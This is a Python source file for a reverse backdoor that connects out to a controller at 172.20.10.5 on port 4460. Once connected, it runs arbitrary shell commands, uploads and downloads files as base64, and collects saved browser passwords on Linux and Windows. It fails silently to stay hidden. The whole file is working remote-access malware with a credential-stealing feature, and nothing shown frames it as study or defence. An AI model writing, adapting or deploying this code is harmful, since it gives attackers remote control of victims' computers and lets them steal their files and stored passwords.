#! /usr/bin/env python

import socket
import subprocess
import json
import os
import base64
import sys
from saved_browser_password import SavedBrowserPassword
import platform

class ReverseBackdoor:
    def __init__(self):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect(("172.20.10.5", 4460))

    def send_json_data(self,command):
        json_data = json.dumps(command)
        self.connection.send(json_data.encode())

    def receive_json_data(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self,command):
        command_output = subprocess.check_output(command,shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
        return command_output

    def change_working_directory(self,path):
        try:
            os.chdir(path)
        except FileNotFoundError:
            sys.exit(0)
        return ("[+] Changing Working Directory to "+ path).encode()

    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())

    def write_file(self,path,file_content):
        with open("/home/vickyvirus/Documents/"+path,"wb") as file:
            file.write(base64.b64decode(file_content))
        file.close()
        return ("[+] Upload Successfully").encode()

    def fetch_browser_passwords(self):
        os = platform.system()
        if os == "Linux":
            saved_browser_password = SavedBrowserPassword()
            saved_browser_password.linux_safe_storage()
            saved_data = saved_browser_password.fetch_data_linux()
            saved_data = saved_browser_password.get_saved_data_linux(saved_data)
        else:
            saved_browser_password = SavedBrowserPassword()
            saved_data = saved_browser_password.fetch_data_windows()
            saved_data = saved_browser_password.get_saved_data_windows(saved_data)

        return saved_data

    def run(self):
        while True:
            command = self.receive_json_data()
            try:
                if command[0]=="exit":
                    self.connection.close()
                    exit()
                elif command[0]=="cd" and len(command)>1:

                    if "'" in command[1]:
                        path = ""
                        for path_with_space in command[1:]:
                            path = path + path_with_space
                            path = path.strip("'")
                            if path_with_space != command[-1]:
                                path = path+ " "

                        command_result = self.change_working_directory(path)
                    else:
                        command_result = self.change_working_directory(command[1])
                elif command[0]=="download":
                    command_result = self.read_file(command[1])
                elif command[0]=="upload":
                    command_result=self.write_file(command[1],command[2])
                elif command[0]=="browserpasswords":
                     command_result = self.fetch_browser_passwords()
                else:
                    command_result = self.execute_system_command(command)
            except Exception :
                command_result="[-] Error during command execution".encode()
            if command[0]=="browserpasswords":
                self.send_json_data(command_result)
            else:
                self.send_json_data(command_result.decode())

try:
    reverse_backdoor = ReverseBackdoor()
    reverse_backdoor.run()
except Exception:
    sys.exit(0)